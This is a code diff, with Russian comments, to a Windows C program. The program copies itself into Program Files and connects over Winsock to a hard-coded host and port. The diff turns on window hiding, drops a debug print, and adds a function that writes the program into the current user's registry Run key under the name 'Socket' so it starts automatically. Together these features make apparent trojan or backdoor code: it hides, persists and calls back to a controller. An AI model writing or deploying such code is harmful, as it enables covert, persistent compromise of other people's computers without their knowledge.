@@ -5,21 +5,27 @@
 
 #pragma comment(lib,"ws2_32.lib")
 #pragma comment(lib, "user32.lib")
+#pragma comment(lib, "advapi32")
+
 #pragma warning(disable:4996) 
 
 #define HOST "192.168.43.153"
 #define PORT 7777
 #define MAX_PATH_LENGTH 500
 #define SYSTEM_DIRECTORY "C:\\Program Files\\"
+#define PROGRAM_NAME "Socket"
 
 void initWinsock();
 SOCKADDR_IN createServer();
 char* copyFileToSystemDirectory();
+void addProgramToAutorun(char* pathToProgram);
 
 int main(int argc, char* argv[]) {
 	// Скрыть окно программы
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
+
 	char* currentExecutionFile = copyFileToSystemDirectory();
+	addProgramToAutorun(currentExecutionFile);
 
 	initWinsock();
 	SOCKADDR_IN server = createServer();
@@ -86,7 +92,6 @@ char* copyFileToSystemDirectory() {
 	char* finalFilePath = (char*) malloc(MAX_PATH_LENGTH * sizeof(char));
 	// Получаем путь к текущему файлу и записываем его в переменную currentFilename
 	GetModuleFileNameA(NULL, currentPathToExecutionFile, MAX_PATH_LENGTH);
-	puts(currentPathToExecutionFile);
 
 	// Чтобы получить название текущего файла, достаем его из конца полного пути к текущему файлу
 	char copy[MAX_PATH_LENGTH];
@@ -102,6 +107,21 @@ char* copyFileToSystemDirectory() {
 		return currentPathToExecutionFile;
 	}
 	else return finalFilePath;
+}
 
-	
+void addProgramToAutorun(char* pathToProgram) {
+	HKEY hg;
+
+	// Открываем раздел Autorun в реестре текущего юзера
+	if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hg)) {
+		puts("No access to the registry");
+		return;
+	}
+
+	// Записываем нашу программу в Autorun
+	if (ERROR_SUCCESS != RegSetValueEx(hg, PROGRAM_NAME, 0, REG_SZ, pathToProgram, MAX_PATH_LENGTH * sizeof(char))) {
+		puts("No access to modify the registry");
+		return;
+	}
+	RegCloseKey(hg);
 }
